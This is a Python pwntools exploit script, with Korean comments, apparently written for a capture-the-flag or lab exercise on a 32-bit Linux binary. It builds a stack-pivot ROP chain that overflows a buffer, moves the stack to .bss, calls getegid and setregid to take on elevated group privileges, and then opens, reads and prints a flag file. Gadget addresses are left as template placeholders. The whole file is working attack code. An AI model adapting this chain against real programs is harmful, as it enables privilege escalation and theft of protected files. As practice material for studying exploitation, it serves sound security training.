from pwn import *

context.arch = "i386"
context.os = "linux"

# ================================================
# ROP 체인 흐름
# stage1. pivot : stage(.bss)를 스택처럼 사용
# stage2. 공격
#   1) syscall setregid : flag를 읽기 위한 권한 세팅 
#   2) syscall ORW : flag 열기, 읽기, 출력
# =================================================

# 필요한 값 세팅
OFFSET     = {bof_offset}
STAGE      = {stage_addr}
READ_PLT   = {read@plt}
LEAVE_RET  = {leave_ret}
POP_EAX    = {pop_eax}
POP_EBX    = {pop_ebx}
POP_ECX    = {pop_ecx}
POP_EDX    = {pop_edx}
MOV_EBX_EAX= {mov_ebx_eax}
MOV_ECX_EAX= {mov_ecx_cax}
SYSCALL    = {int_0x80}


# =================================================
# stage1. pivot
# =================================================
stage1  = b"A" * OFFSET        # offset
stage1 += p32(STAGE)           # saved EBP = stage addr
stage1 += p32(READ_PLT)        # saved RET = read@plt
stage1 += p32(LEAVE_RET)       # next RET = leave_ret
stage1 += p32(0)               # arg1(fd) = 0 (stdin)
stage1 += p32(STAGE)           # arg2 = stage
stage1 += p32(0x800)           # arg3(size) = 0x800
stage1 = stage1.ljust(400, b"B")


# =================================================
# stage2. exploit
# =================================================
FLAG_OFF = 0x300
BUF_OFF  = 0x400

FLAG = STAGE + FLAG_OFF
BUF  = STAGE + BUF_OFF

stage2 = p32(0xdeadbeef)      # fake_ebp

# --------------- (1) setregid ------------------
stage2 += p32(POP_EAX) + p32(50)  # getegid
stage2 += p32(SYSCALL)            # eax에 gid 저장됨

stage2 += p32(MOV_EBX_EAX)
stage2 += p32(MOV_ECX_EAX)
stage2 += p32(POP_EAX) + p32(71)  # setregid
stage2 += p32(SYSCALL)

# ---------------- (2) ORW ----------------------

# open("flag", 0, 0)
stage2 += p32(POP_EAX) + p32(5)
stage2 += p32(POP_EBX) + p32(FLAG)
stage2 += p32(POP_ECX) + p32(0)
stage2 += p32(POP_EDX) + p32(0)
stage2 += p32(SYSCALL)
stage2 += p32(MOV_EBX_EAX)
# read(fd, BUF, 0x40)
stage2 += p32(POP_EAX) + p32(3)
stage2 += p32(POP_ECX) + p32(BUF)
stage2 += p32(POP_EDX) + p32(0x40)
stage2 += p32(SYSCALL)

# write(1, BUF, 0x40)
stage2 += p32(POP_EAX) + p32(4)
stage2 += p32(POP_EBX) + p32(1)
stage2 += p32(POP_ECX) + p32(BUF)
stage2 += p32(POP_EDX) + p32(0x40)
stage2 += p32(SYSCALL)

stage2 = stage2.ljust(FLAG_OFF, b"\x00") # flag 문자열 위치 맞추기
stage2 += b"/tmp/bof-rop-pivot/flag\x00"

# =================================================
# 출력
# =================================================
import sys
sys.stdout.buffer.write(stage1)
sys.stdout.buffer.write(stage2)
